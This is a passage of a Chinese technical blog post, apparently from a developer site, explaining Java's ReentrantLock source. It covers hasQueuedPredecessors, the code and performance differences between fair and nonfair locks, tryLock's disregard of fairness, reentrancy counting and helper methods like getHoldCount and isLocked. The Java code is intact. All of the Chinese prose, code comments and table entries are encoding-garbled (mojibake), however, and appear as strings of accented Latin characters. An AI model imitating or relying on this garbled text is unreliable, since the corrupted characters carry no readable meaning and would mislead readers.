            <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
            <span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>)
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
            setState(nextc);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<h4 data-id="heading-82">4.2 hasQueuedPredecessors - æ£€æŸ¥å‰é©±ç­‰å¾…è€…</h4>
<p>è¿™æ˜¯å…¬å¹³é”çš„æ ¸å¿ƒæ–¹æ³•ï¼Œåˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦éœ€è¦æ’é˜Ÿï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŸ¥è¯¢æ˜¯å¦æœ‰çº¿ç¨‹æ¯”å½“å‰çº¿ç¨‹ç­‰å¾…æ›´ä¹…
 * <span class="hljs-doctag">@return</span> trueè¡¨ç¤ºæœ‰å‰é©±ç­‰å¾…è€…ï¼Œå½“å‰çº¿ç¨‹éœ€è¦æ’é˜Ÿ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasQueuedPredecessors</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail;
    <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
    Node s;
    <span class="hljs-keyword">return</span> h != t &amp;&amp;
        ((s = h.next) == <span class="hljs-literal">null</span> || s.thread != Thread.currentThread());
}
</code></pre>
<p><strong>é€»è¾‘è§£æ</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c675a23e1b624f40934050318c0f9b54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=CaePWKjVxZ211VGTWJNBiz9Y8pk%3D" alt="hasQueuedPredecessors-flow.drawio.png" loading="lazy"/></p>
<p><strong>è¿”å›trueçš„æƒ…å†µ</strong>ï¼ˆéœ€è¦æ’é˜Ÿï¼‰ï¼š</p>
<ol>
<li>é˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œä¸”æœ‰å…¶ä»–çº¿ç¨‹åœ¨ç­‰å¾…</li>
<li>é˜Ÿåˆ—æ­£åœ¨åˆå§‹åŒ–ï¼ˆhead.nextä¸ºnullï¼‰</li>
</ol>
<p><strong>è¿”å›falseçš„æƒ…å†µ</strong>ï¼ˆå¯ä»¥å°è¯•è·å–ï¼‰ï¼š</p>
<ol>
<li>é˜Ÿåˆ—ä¸ºç©º</li>
<li>å½“å‰çº¿ç¨‹å°±æ˜¯ç¬¬ä¸€ä¸ªç­‰å¾…è€…</li>
</ol>
<hr/>
<h3 data-id="heading-83">5. å…¬å¹³é”vséå…¬å¹³é”å¯¹æ¯”</h3>
<h4 data-id="heading-84">5.1 ä»£ç å·®å¼‚</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ============ éå…¬å¹³é” ============</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
    
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å·®å¼‚1ï¼šç›´æ¥å°è¯•CASæ’é˜Ÿ</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>))
            setExclusiveOwnerThread(Thread.currentThread());
        <span class="hljs-keyword">else</span>
            acquire(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
        <span class="hljs-comment">// å·®å¼‚2ï¼šä¸æ£€æŸ¥é˜Ÿåˆ—ï¼Œç›´æ¥å°è¯•è·å–</span>
        <span class="hljs-keyword">return</span> nonfairTryAcquire(acquires);
    }
}

<span class="hljs-comment">// ============ å…¬å¹³é” ============</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
    
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å·®å¼‚1ï¼šæ²¡æœ‰æ’é˜Ÿï¼Œç›´æ¥acquire</span>
        acquire(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
        <span class="hljs-comment">// ...</span>
        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å·®å¼‚2ï¼šå…ˆæ£€æŸ¥æ˜¯å¦æœ‰ç­‰å¾…è€…</span>
            <span class="hljs-keyword">if</span> (!hasQueuedPredecessors() &amp;&amp; 
                compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
                <span class="hljs-comment">// ...</span>
            }
        }
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<h4 data-id="heading-85">5.2 è¡Œä¸ºå¯¹æ¯”</h4>








































<table><thead><tr><th align="left">æ–¹é¢</th><th align="left">éå…¬å¹³é”</th><th align="left">å…¬å¹³é”</th></tr></thead><tbody><tr><td align="left">lock()é¦–æ¬¡å°è¯•</td><td align="left">CASæ’é˜Ÿ</td><td align="left">ç›´æ¥acquire</td></tr><tr><td align="left">tryAcquireæ£€æŸ¥</td><td align="left">ä¸æ£€æŸ¥é˜Ÿåˆ—</td><td align="left">æ£€æŸ¥hasQueuedPredecessors</td></tr><tr><td align="left">æ’é˜Ÿæœºä¼š</td><td align="left">2æ¬¡</td><td align="left">0æ¬¡</td></tr><tr><td align="left">é¥¥é¥¿å¯èƒ½</td><td align="left">æœ‰</td><td align="left">æ— </td></tr><tr><td align="left">ååé‡</td><td align="left">é«˜</td><td align="left">ä½</td></tr><tr><td align="left">çº¿ç¨‹åˆ‡æ¢</td><td align="left">å°‘</td><td align="left">å¤š</td></tr></tbody></table>
<h4 data-id="heading-86">5.3 æ€§èƒ½å·®å¼‚åˆ†æ</h4>
<p><strong>éå…¬å¹³é”æ›´å¿«çš„åŸå› </strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T1 as çº¿ç¨‹1(æŒæœ‰é”)
    participant T2 as çº¿ç¨‹2(ç­‰å¾…ä¸­)
    participant T3 as çº¿ç¨‹3(æ–°æ¥çš„)
    
    Note over T1,T3: éå…¬å¹³é”åœºæ™¯
    T1-&gt;&gt;T1: é‡Šæ”¾é”
    T1-&gt;&gt;T2: unpark(T2)
    Note over T2: å”¤é†’ä¸­...
    T3-&gt;&gt;T3: lock() - CASæˆåŠŸ
    Note over T3: T3æ’é˜Ÿè·å–é”
    Note over T2: å”¤é†’åå‘ç°é”æ²¡äº†
    Note over T2: ç»§ç»­ç­‰å¾…
    
    Note over T1,T3: æ€»ç»“ï¼šT3ä¸éœ€è¦ä¸Šä¸‹æ–‡åˆ‡æ¢
</code></pre>
<p><strong>éå…¬å¹³é”å‡å°‘çš„å¼€é”€</strong>ï¼š</p>
<ol>
<li>å‡å°‘çº¿ç¨‹åˆ‡æ¢æ¬¡æ•°</li>
<li>é¿å…"åˆšå”¤é†’å°±è¦ç¡çœ "çš„æƒ…å†µ</li>
<li>æé«˜CPUç¼“å­˜å‘½ä¸­ç‡</li>
</ol>
<p><strong>å…¬å¹³é”æ›´æ…¢çš„åŸå› </strong>ï¼š</p>
<ol>
<li>æ¯æ¬¡è·å–é”éƒ½è¦æ£€æŸ¥é˜Ÿåˆ—</li>
<li>å¿…é¡»ä¸¥æ ¼æŒ‰é¡ºåºå”¤é†’</li>
<li>æ›´å¤šçš„çº¿ç¨‹åˆ‡æ¢</li>
</ol>
<h4 data-id="heading-87">5.4 é€‰æ‹©å»ºè®®</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b68aeab0e674a50af3438a750ae5c83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=jLPUQHVyR7H0O%2FNbApkr23yH6W4%3D" alt="lock-type-selection.drawio.png" loading="lazy"/></p>
<p><strong>ä½¿ç”¨éå…¬å¹³é”çš„åœºæ™¯</strong>ï¼ˆé»˜è®¤ï¼‰ï¼š</p>
<ul>
<li>å¤§å¤šæ•°ä¸šåŠ¡åœºæ™¯</li>
<li>è¿½æ±‚é«˜ååé‡</li>
<li>é”æŒæœ‰æ—¶é—´çŸ­</li>
</ul>
<p><strong>ä½¿ç”¨å…¬å¹³é”çš„åœºæ™¯</strong>ï¼š</p>
<ul>
<li>ä¸¥æ ¼è¦æ±‚æŒ‰é¡ºåºå¤„ç†</li>
<li>é¿å…çº¿ç¨‹é¥¥é¥¿</li>
<li>å…¬å¹³æ€§æ¯”æ€§èƒ½æ›´é‡è¦</li>
</ul>
<hr/>
<h4 data-id="heading-88">5.5 tryLockåœ¨å…¬å¹³/éå…¬å¹³é”ä¸­çš„è¡Œä¸º</h4>
<h5 data-id="heading-89">5.5.1 å…³é”®åŒºåˆ«</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * tryLock()åœ¨å…¬å¹³é”å’Œéå…¬å¹³é”ä¸­çš„è¡Œä¸ºå·®å¼‚
 * 
 * ã€é‡è¦ã€‘tryLock()ä¸éµå¾ªå…¬å¹³æ€§ï¼
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TryLockBehavior</span> {
    
    <span class="hljs-comment">// å…¬å¹³é”</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">fairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateTryLock</span><span class="hljs-params">()</span> {
        
        <span class="hljs-comment">// lock()æ–¹æ³•éµå¾ªå…¬å¹³æ€§</span>
        <span class="hljs-comment">// å…¬å¹³é”ï¼šæ£€æŸ¥é˜Ÿåˆ—ï¼Œæœ‰ç­‰å¾…è€…åˆ™ä¸æ’é˜Ÿ</span>
        <span class="hljs-comment">// éå…¬å¹³é”ï¼šç›´æ¥å°è¯•è·å–</span>
        
        <span class="hljs-comment">// tryLock()æ–¹æ³•ã€ä¸éµå¾ªå…¬å¹³æ€§ã€‘ï¼</span>
        <span class="hljs-comment">// å³ä½¿æ˜¯å…¬å¹³é”ï¼ŒtryLock()ä¹Ÿä¼šç›´æ¥å°è¯•è·å–ï¼Œä¸æ£€æŸ¥é˜Ÿåˆ—ï¼</span>
        <span class="hljs-keyword">if</span> (fairLock.tryLock()) {  <span class="hljs-comment">// æ’é˜Ÿè·å–ï¼Œä¸ç®¡é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰ç­‰å¾…è€…</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                fairLock.unlock();
            }
        }
        
        <span class="hljs-comment">// å¦‚æœéœ€è¦å…¬å¹³çš„tryLockï¼Œä½¿ç”¨å¸¦è¶…æ—¶çš„ç‰ˆæœ¬ï¼š</span>
        <span class="hljs-comment">// tryLock(0, TimeUnit.SECONDS) ä¼šéµå¾ªå…¬å¹³æ€§ï¼</span>
    }
}
</code></pre>
<h5 data-id="heading-90">5.5.2 æºç åˆ†æ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ReentrantLock.tryLock() æºç </span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.nonfairTryAcquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// ã€æ³¨æ„ã€‘è°ƒç”¨çš„æ˜¯nonfairTryAcquireï¼</span>
}

<span class="hljs-comment">// ReentrantLock.tryLock(timeout, unit) æºç </span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException {
    <span class="hljs-keyword">return</span> sync.tryAcquireNanos(<span class="hljs-number">1</span>, unit.toNanos(timeout));  <span class="hljs-comment">// è¿™ä¸ªä¼šæ£€æŸ¥å…¬å¹³æ€§</span>
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆtryLock()ä¸éµå¾ªå…¬å¹³æ€§ï¼Ÿ</strong></p>
<ul>
<li><strong>è®¾è®¡æ„å›¾</strong>ï¼štryLock()æ˜¯"å°è¯•è·å–"ï¼Œå¦‚æœè¦æ’é˜Ÿé‚£å°±ä¸æ˜¯"å°è¯•"äº†</li>
<li><strong>æ€§èƒ½è€ƒè™‘</strong>ï¼šæ£€æŸ¥é˜Ÿåˆ—éœ€è¦é¢å¤–å¼€é”€</li>
<li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šé€šå¸¸ç”¨äº"èƒ½è·å–å°±è·å–ï¼Œä¸èƒ½å°±ç®—äº†"çš„åœºæ™¯</li>
</ul>
<h3 data-id="heading-91">6. å¯é‡å…¥æœºåˆ¶è¯¦è§£</h3>
<h4 data-id="heading-92">6.1 ä»€ä¹ˆæ˜¯å¯é‡å…¥</h4>
<p>å¯é‡å…¥ï¼ˆReentrantï¼‰æ˜¯æŒ‡åŒä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤šæ¬¡è·å–åŒä¸€æŠŠé”ï¼Œè€Œä¸ä¼šé€ æˆæ­»é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¯é‡å…¥æ¼”ç¤º
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantDemo</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–ï¼Œstate = 1</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"methodA"</span>);
            methodB();  <span class="hljs-comment">// è°ƒç”¨methodBï¼Œå†æ¬¡è·å–é”</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// state = 0</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡è·å–ï¼Œstate = 2ï¼ˆé‡å…¥ï¼ï¼‰</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"methodB"</span>);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// state = 1</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-93">6.2 é‡å…¥å®ç°åŸç†</h4>
<p><strong>è·å–é”æ—¶çš„é‡å…¥åˆ¤æ–­</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// é”ç©ºé—²ï¼Œé¦–æ¬¡è·å–</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
            setExclusiveOwnerThread(current);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    <span class="hljs-comment">// é‡å…¥åˆ¤æ–­ï¼šå½“å‰çº¿ç¨‹æ˜¯å¦æ˜¯é”æŒæœ‰è€…</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current == getExclusiveOwnerThread()) {
        <span class="hljs-comment">// æ˜¯ï¼Œstateç´¯åŠ </span>
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
        <span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(nextc);  <span class="hljs-comment">// æ— éœ€CASï¼Œå› ä¸ºæ˜¯ç‹¬å çš„</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>é‡Šæ”¾é”æ—¶çš„é‡å…¥å¤„ç†</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState() - releases;  <span class="hljs-comment">// stateå‡1</span>
    
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-comment">// åªæœ‰stateå‡åˆ°0æ‰çœŸæ­£é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        free = <span class="hljs-literal">true</span>;
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    }
    setState(c);
    <span class="hljs-keyword">return</span> free;  <span class="hljs-comment">// è¿”å›æ˜¯å¦å®Œå…¨é‡Šæ”¾</span>
}
</code></pre>
<h4 data-id="heading-94">6.3 é‡å…¥è¿‡ç¨‹å›¾è§£</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T as çº¿ç¨‹
    participant Lock as ReentrantLock
    
    Note over Lock: state=0, owner=null
    
    T-&gt;&gt;Lock: lock() [ç¬¬1æ¬¡]
    Lock-&gt;&gt;Lock: state: 0â†’1, owner=T
    Note over Lock: state=1, owner=T
    
    T-&gt;&gt;Lock: lock() [ç¬¬2æ¬¡ï¼Œé‡å…¥]
    Lock-&gt;&gt;Lock: state: 1â†’2
    Note over Lock: state=2, owner=T
    
    T-&gt;&gt;Lock: lock() [ç¬¬3æ¬¡ï¼Œé‡å…¥]
    Lock-&gt;&gt;Lock: state: 2â†’3
    Note over Lock: state=3, owner=T
    
    T-&gt;&gt;Lock: unlock()
    Lock-&gt;&gt;Lock: state: 3â†’2
    Note over Lock: state=2, owner=T
    
    T-&gt;&gt;Lock: unlock()
    Lock-&gt;&gt;Lock: state: 2â†’1
    Note over Lock: state=1, owner=T
    
    T-&gt;&gt;Lock: unlock()
    Lock-&gt;&gt;Lock: state: 1â†’0, owner=null
    Note over Lock: state=0, owner=null&lt;br/&gt;é”å®Œå…¨é‡Šæ”¾
</code></pre>
<h4 data-id="heading-95">6.4 ä¸ºä»€ä¹ˆéœ€è¦å¯é‡å…¥</h4>
<p>å¦‚æœé”ä¸æ”¯æŒé‡å…¥ï¼Œä¼šå‘ç”Ÿæ­»é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å‡è®¾é”ä¸å¯é‡å…¥
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonReentrantProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"methodA"</span>);
        methodB();  <span class="hljs-comment">// æ­»é”ï¼å½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œæ— æ³•å†æ¬¡è·å–</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"methodB"</span>);
    }
}
</code></pre>
<p><strong>å¯é‡å…¥çš„æ„ä¹‰</strong>ï¼š</p>
<ol>
<li>æ”¯æŒé€’å½’è°ƒç”¨</li>
<li>æ”¯æŒåŒæ­¥æ–¹æ³•ç›¸äº’è°ƒç”¨</li>
<li>ç®€åŒ–ç¼–ç¨‹æ¨¡å‹ï¼Œé¿å…æ„å¤–æ­»é”</li>
</ol>
<h4 data-id="heading-96">6.5 æœ€å¤§é‡å…¥æ¬¡æ•°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
<span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>)  <span class="hljs-comment">// overflow</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
</code></pre>
<p>ç”±äº<code>state</code>æ˜¯intç±»å‹ï¼Œæœ€å¤§é‡å…¥æ¬¡æ•°çº¦ä¸º<code>Integer.MAX_VALUE</code>ï¼ˆçº¦21äº¿ï¼‰ã€‚å®é™…ä½¿ç”¨ä¸­åŸºæœ¬ä¸å¯èƒ½è¾¾åˆ°è¿™ä¸ªé™åˆ¶ã€‚</p>
<hr/>
<h3 data-id="heading-97">7. è¾…åŠ©æ–¹æ³•æºç åˆ†æ</h3>
<h4 data-id="heading-98">7.1 getHoldCount - è·å–é‡å…¥æ¬¡æ•°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è·å–å½“å‰çº¿ç¨‹æŒæœ‰é”çš„æ¬¡æ•°
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHoldCount</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.getHoldCount();
}

<span class="hljs-comment">// Sync.getHoldCount</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHoldCount</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> isHeldExclusively() ? getState() : <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šè°ƒè¯•å’Œæµ‹è¯•</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">debugMethod</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        System.out.println(<span class="hljs-string">"é‡å…¥æ¬¡æ•°: "</span> + lock.getHoldCount());  <span class="hljs-comment">// 1</span>
        
        lock.lock();
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"é‡å…¥æ¬¡æ•°: "</span> + lock.getHoldCount());  <span class="hljs-comment">// 2</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
        
        System.out.println(<span class="hljs-string">"é‡å…¥æ¬¡æ•°: "</span> + lock.getHoldCount());  <span class="hljs-comment">// 1</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-99">7.2 isHeldByCurrentThread - å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŸ¥è¯¢å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldByCurrentThread</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.isHeldExclusively();
}

<span class="hljs-comment">// Sync.isHeldExclusively</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getExclusiveOwnerThread() == Thread.currentThread();
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šæ–­è¨€æ£€æŸ¥</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">criticalSection</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ç¡®ä¿è¿›å…¥ä¸´ç•ŒåŒºæ—¶æŒæœ‰é”</span>
    <span class="hljs-keyword">assert</span> lock.isHeldByCurrentThread();
    
    <span class="hljs-comment">// ä¸´ç•ŒåŒºä»£ç ...</span>
}
</code></pre>
<h4 data-id="heading-100">7.3 isLocked - é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŸ¥è¯¢é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.isLocked();
}

<span class="hljs-comment">// Sync.isLocked</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getState() != <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>æ³¨æ„</strong>ï¼šè¿™ä¸ªæ–¹æ³•è¿”å›çš„æ˜¯"å¿«ç…§"ï¼Œè¿”å›åçŠ¶æ€å¯èƒ½å·²ç»æ”¹å˜ã€‚ä¸»è¦ç”¨äºç›‘æ§ã€‚</p>
<h4 data-id="heading-101">7.4 getOwner - è·å–é”æŒæœ‰è€…</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è·å–é”çš„æŒæœ‰çº¿ç¨‹
 * <span class="hljs-doctag">@return</span> æŒæœ‰çº¿ç¨‹ï¼Œå¦‚æœæœªé”å®šåˆ™è¿”å›null
 */</span>
<span class="hljs-keyword">protected</span> Thread <span class="hljs-title function_">getOwner</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.getOwner();
}

<span class="hljs-comment">// Sync.getOwner</span>
<span class="hljs-keyword">final</span> Thread <span class="hljs-title function_">getOwner</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getState() == <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : getExclusiveOwnerThread();
}
</code></pre>
<p><strong>æ³¨æ„</strong>ï¼šè¿™æ˜¯protectedæ–¹æ³•ï¼Œä¸»è¦ä¾›å­ç±»ä½¿ç”¨ã€‚</p>
<h4 data-id="heading-102">7.5 hasQueuedThreads/getQueueLength - é˜Ÿåˆ—ç›¸å…³æ–¹æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŸ¥è¯¢æ˜¯å¦æœ‰çº¿ç¨‹åœ¨ç­‰å¾…è·å–é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasQueuedThreads</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.hasQueuedThreads();
}

<span class="hljs-comment">/**
 * è·å–ç­‰å¾…é˜Ÿåˆ—çš„é•¿åº¦ä¼°è®¡å€¼
 */</span>
